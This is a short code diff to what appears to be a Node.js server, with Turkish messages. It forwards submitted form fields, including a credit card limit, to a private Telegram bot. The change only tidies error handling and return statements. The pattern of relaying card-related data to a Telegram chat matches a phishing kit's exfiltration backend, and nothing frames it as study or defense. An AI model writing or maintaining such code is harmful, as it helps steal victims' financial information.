@@ -14,7 +14,7 @@ const chatId = process.env.CHAT_ID;
 
 if (!botToken || !chatId) {
   console.error('Hata: BOT_TOKEN veya CHAT_ID eksik. Lütfen environment variables\'ı kontrol edin.');
-  process.exit(1);
+  return (req, res) => res.status(500).json({ error: 'Sunucu yapılandırma hatası.' });
 }
 
 // Tüm istekler için metod kontrolü
@@ -52,13 +52,13 @@ Kredi Kartı Limiti: ${kredi_karti_limiti}
       parse_mode: 'HTML',
     });
     console.log('[Backend] Telegram mesajı gönderildi:', response.data);
-    res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
+    return res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
   } catch (error) {
     console.error('[Backend] Telegram mesajı gönderilemedi:', {
       message: error.message,
       response: error.response ? error.response.data : null,
     });
-    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.', details: error.message });
+    return res.status(500).json({ error: 'Telegram mesajı gönderilemedi.', details: error.message });
   }
 });
 
